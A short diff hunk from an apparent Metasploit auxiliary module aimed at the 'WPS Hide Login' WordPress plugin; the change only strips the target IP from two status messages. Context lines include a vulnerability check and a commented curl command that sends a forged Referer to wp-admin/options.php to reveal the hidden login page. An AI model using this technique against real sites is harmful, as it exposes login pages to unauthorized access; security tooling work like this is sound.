@@ -47,9 +47,9 @@ class MetasploitModule < Msf::Auxiliary
     unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
       fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of the 'WPS Hide Login' was not found"
     end
-    print_good("#{ip} - Vulnerable version of wps_hide_login detected")
+    print_good("Vulnerable version of wps_hide_login detected")
 
-    print_status("#{ip} - Determining login page")
+    print_status("Determining login page")
     # curl --referer "something" -sIXGET http://<ip>/wp-admin/options.php
     res = send_request_cgi({
       'method' => 'GET',
